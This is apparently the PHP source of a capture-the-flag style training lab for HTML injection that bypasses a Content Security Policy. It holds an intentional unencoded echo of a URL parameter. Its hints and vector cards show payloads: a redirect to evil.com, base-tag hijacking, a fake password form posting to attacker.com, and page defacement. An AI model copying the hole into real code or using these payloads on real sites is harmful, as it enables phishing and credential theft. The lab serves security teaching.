<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['HTML-Injection']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// ─── Session Initialization ──────────────────────────────────────────────
if (!isset($_SESSION['html_case6_attempts'])) {
  $_SESSION['html_case6_attempts'] = 0;
}
if (!isset($_SESSION['html_case6_solved'])) {
  $_SESSION['html_case6_solved'] = false;
}

// ─── CSP Header ──────────────────────────────────────────────────────────
// Strict CSP that blocks inline scripts but allows HTML injection vectors
header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src *; form-action *;");

// ─── Vulnerable Page Content Logic ───────────────────────────────────────
$page_content = $_GET['page'] ?? 'welcome';
$html_injected = false;
$flag_triggered = false;
$csp_bypassed = false;

if (!empty($page_content)) {
  // Check for HTML injection
  if (preg_match('/<[a-zA-Z][^>]*>/', $page_content)) {
    $html_injected = true;

    // Check for CSP bypass vectors
    $decoded = html_entity_decode($page_content);
    if (
      preg_match('/<meta\s+http-equiv=["\']?refresh["\']?/i', $decoded) ||
      preg_match('/<form\s+action=/i', $decoded) ||
      preg_match('/<base\s+href=/i', $decoded) ||
      preg_match('/<a\s+href=/i', $decoded) ||
      preg_match('/<iframe/i', $decoded) ||
      preg_match('/<object/i', $decoded) ||
      preg_match('/<embed/i', $decoded)
    ) {
      $csp_bypassed = true;
      $flag_triggered = true;
    }

    // Also trigger on style-based defacement
    if (preg_match('/<\w+\s+style=/i', $decoded)) {
      $csp_bypassed = true;
    }
  }
}

// ─── Solve Detection ─────────────────────────────────────────────────────
$success_msg = null;
$already_solved = $_SESSION['html_case6_solved'];

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['html_case6_attempts']++;

  if (!$already_solved && isset($_SESSION['user_id'])) {
    solveLab($pdo, $lab['id']);
  }

  $_SESSION['html_case6_solved'] = true;
  $already_solved = true;
  $success_msg = "Outstanding! You've successfully bypassed Content Security Policy using HTML-only injection vectors. You demonstrated that even with strict CSP, HTML injection can still lead to phishing, defacement, and data exfiltration!";
}

// ─── Attempt Tracking ──────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['page'])) {
  $_SESSION['html_case6_attempts']++;
}

$attempts = $_SESSION['html_case6_attempts'];
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Portal - HTML Injection Case 6 (CSP Bypass)</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/HTML-CASE6.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to HTML Injection Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge hard"><i class="fas fa-fire"></i> Hard Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-shield-alt"></i> Secure Portal (CSP Protected)</h1>
      <p class="lab-description">Access our high-security portal with Content Security Policy protection. This hard HTML
        Injection challenge has <strong>strict CSP headers</strong> blocking scripts, but HTML tags are still rendered.
        <strong>Bypass CSP using HTML-only vectors!</strong>
      </p>
    </div>

    <?php if ($already_solved): ?>
      <div class="success-alert solved-banner">
        <i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Already Solved!</h3>
          <p>You have already exploited this CSP Bypass HTML Injection vulnerability. You can continue exploring, but no
            additional points will be awarded.</p>
        </div>
      </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
      <div class="success-alert">
        <i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Completed!</h3>
          <p><?php echo $success_msg; ?></p>
        </div>
      </div>
    <?php endif; ?>

    <!-- CSP Info Banner -->
    <div class="csp-banner">
      <i class="fas fa-lock"></i>
      <div class="csp-content">
        <strong>Content Security Policy Active</strong>
        <code>default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';</code>
      </div>
    </div>

    <!-- Portal Grid -->
    <div class="portal-grid">

      <!-- Page Selector -->
      <div class="portal-card selector-card">
        <div class="card-header">
          <i class="fas fa-list"></i>
          <h3>Page Selector</h3>
        </div>

        <form method="GET" action="" class="page-form" id="page-form">
          <div class="form-group">
            <label><i class="fas fa-file"></i> Select Page</label>
            <select name="page" class="form-select" onchange="this.form.submit()">
              <option value="welcome" <?php echo $page_content === 'welcome' ? 'selected' : ''; ?>>Welcome</option>
              <option value="dashboard" <?php echo $page_content === 'dashboard' ? 'selected' : ''; ?>>Dashboard
              </option>
              <option value="settings" <?php echo $page_content === 'settings' ? 'selected' : ''; ?>>Settings</option>
              <option value="profile" <?php echo $page_content === 'profile' ? 'selected' : ''; ?>>Profile</option>
            </select>
          </div>
        </form>

        <div class="manual-input">
          <span class="input-label">Or inject directly via URL:</span>
          <code class="url-example">?page=&lt;your-html-here&gt;</code>
        </div>

        <div class="csp-warning">
          <i class="fas fa-exclamation-triangle"></i>
          <span>CSP blocks &lt;script&gt; but allows other HTML tags!</span>
        </div>
      </div>

      <!-- Content Display (Vulnerable) -->
      <div class="portal-card display-card">
        <div class="card-header">
          <i class="fas fa-eye"></i>
          <h3>Page Content</h3>
          <span class="vuln-badge"><i class="fas fa-unlock"></i> Raw HTML Rendered</span>
        </div>

        <!-- VULNERABLE: Direct output without encoding -->
        <div class="content-display">
          <?php
          if ($page_content === 'welcome') {
            echo '<div class="default-content"><i class="fas fa-shield-alt"></i><h3>Welcome to Secure Portal</h3><p>This portal is protected by Content Security Policy. However, HTML injection is still possible!</p></div>';
          } elseif ($page_content === 'dashboard') {
            echo '<div class="default-content"><i class="fas fa-chart-line"></i><h3>Dashboard</h3><p>View your security metrics and lab progress.</p></div>';
          } elseif ($page_content === 'settings') {
            echo '<div class="default-content"><i class="fas fa-cog"></i><h3>Settings</h3><p>Configure your account preferences.</p></div>';
          } elseif ($page_content === 'profile') {
            echo '<div class="default-content"><i class="fas fa-user"></i><h3>Profile</h3><p>Manage your public profile information.</p></div>';
          } else {
            // VULNERABLE: Direct echo of user input
            echo $page_content;
          }
          ?>
        </div>

        <?php if ($html_injected): ?>
          <div class="injection-alert">
            <i class="fas fa-exclamation-triangle"></i>
            <div class="injection-content">
              <strong>HTML Injection Detected!</strong>
              <span>Raw HTML was rendered in the content area.</span>
            </div>
          </div>
        <?php endif; ?>

        <?php if ($csp_bypassed): ?>
          <div class="bypass-alert">
            <i class="fas fa-check-circle"></i>
            <div class="bypass-content">
              <strong>CSP Bypass Achieved!</strong>
              <span>You found an HTML vector that works despite CSP protection!</span>
            </div>
          </div>
        <?php endif; ?>
      </div>

      <!-- CSP Analysis -->
      <div class="portal-card analysis-card">
        <div class="card-header">
          <i class="fas fa-microscope"></i>
          <h3>CSP Analysis</h3>
        </div>
        <div class="csp-rules">
          <div class="rule-item blocked">
            <i class="fas fa-times-circle"></i>
            <div class="rule-text">
              <strong>script-src 'self'</strong>
              <span>Blocks all inline & external scripts</span>
            </div>
          </div>
          <div class="rule-item blocked">
            <i class="fas fa-times-circle"></i>
            <div class="rule-text">
              <strong>javascript: URLs</strong>
              <span>Blocked in href attributes</span>
            </div>
          </div>
          <div class="rule-item allowed">
            <i class="fas fa-check-circle"></i>
            <div class="rule-text">
              <strong>HTML Tags</strong>
              <span>Still rendered without encoding!</span>
            </div>
          </div>
          <div class="rule-item allowed">
            <i class="fas fa-check-circle"></i>
            <div class="rule-text">
              <strong>meta refresh</strong>
              <span>Can redirect users</span>
            </div>
          </div>
          <div class="rule-item allowed">
            <i class="fas fa-check-circle"></i>
            <div class="rule-text">
              <strong>form action</strong>
              <span>Can submit data elsewhere</span>
            </div>
          </div>
        </div>
      </div>

      <!-- Bypass Vectors -->
      <div class="portal-card vectors-card">
        <div class="card-header">
          <i class="fas fa-bolt"></i>
          <h3>CSP Bypass Vectors</h3>
        </div>
        <div class="vectors-list">
          <div class="vector-item">
            <div class="vector-name">Meta Refresh Redirect</div>
            <code class="vector-code">&lt;meta http-equiv="refresh" content="0;url=https://evil.com"&gt;</code>
            <span class="vector-desc">Redirect users to malicious site</span>
          </div>
          <div class="vector-item">
            <div class="vector-name">Form Action Hijacking</div>
            <code
              class="vector-code">&lt;form action="https://evil.com"&gt;&lt;input type="password" name="pass"&gt;&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;</code>
            <span class="vector-desc">Create fake login form</span>
          </div>
          <div class="vector-item">
            <div class="vector-name">Base Tag Hijacking</div>
            <code class="vector-code">&lt;base href="https://evil.com/"&gt;</code>
            <span class="vector-desc">Hijack all relative URLs</span>
          </div>
          <div class="vector-item">
            <div class="vector-name">Style Defacement</div>
            <code
              class="vector-code">&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;z-index:9999"&gt;&lt;h1&gt;HACKED&lt;/h1&gt;&lt;/div&gt;</code>
            <span class="vector-desc">Full page defacement</span>
          </div>
        </div>
      </div>
    </div>

    <!-- Debug Panel -->
    <div class="debug-panel">
      <div class="debug-header">
        <i class="fas fa-code"></i>
        <span>Current Request</span>
      </div>
      <div class="debug-body">
        <code><?php echo $_SERVER['REQUEST_METHOD']; ?> <?php echo $_SERVER['REQUEST_URI']; ?></code>
        <div class="request-details">
          <span>Page Param: <?php echo htmlspecialchars(substr($page_content, 0, 50)); ?></span>
          <span>HTML Injected: <?php echo $html_injected ? 'YES' : 'NO'; ?></span>
          <span>CSP Bypassed: <?php echo $csp_bypassed ? 'YES' : 'NO'; ?></span>
          <span>Flag Triggered: <?php echo $flag_triggered ? 'YES' : 'NO'; ?></span>
        </div>
      </div>
    </div>

    <!-- Hints -->
    <?php if ($attempts >= 2): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
        <div class="hint-text">CSP blocks JavaScript but <strong>NOT HTML</strong>. Try injecting a
          <code>&lt;meta&gt;</code> tag with <code>http-equiv="refresh"</code> to redirect users, or a
          <code>&lt;form&gt;</code> tag to create a fake login page.
        </div>
      </div>
    <?php endif; ?>

    <?php if ($attempts >= 4): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
        <div class="hint-text">The <code>form-action</code> directive in CSP allows any destination. Try:
          <code>&lt;form action="https://attacker.com"&gt;&lt;h3&gt;Please Re-Authenticate&lt;/h3&gt;&lt;input type="password" placeholder="Password"&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;/form&gt;</code>
        </div>
      </div>
    <?php endif; ?>

    <?php if ($attempts >= 6): ?>
      <div class="hint-box hint-final">
        <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
        <div class="hint-text">Use this payload in the URL:
          <code>?page=&lt;meta http-equiv="refresh" content="0;url=https://evil.com"&gt;</code> for a redirect, or
          <code>?page=&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(45deg,red,black);display:flex;align-items:center;justify-content:center;z-index:9999"&gt;&lt;h1 style="color:white;font-size:4rem"&gt;PWNED&lt;/h1&gt;&lt;/div&gt;</code>
          for defacement!
        </div>
      </div>
    <?php endif; ?>

    <!-- Attempts Counter -->
    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <!-- Hidden form for solve detection -->
  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
  </form>

  <script>
    window.addEventListener('load', function() {
      const bypassAlert = document.querySelector('.bypass-alert');
      const alreadySolved = document.querySelector('.solved-banner');

      if (bypassAlert && !alreadySolved) {
        document.getElementById('solved-flag').value = '1';
        document.getElementById('success-form').submit();
      }
    });
  </script>
</body>

</html>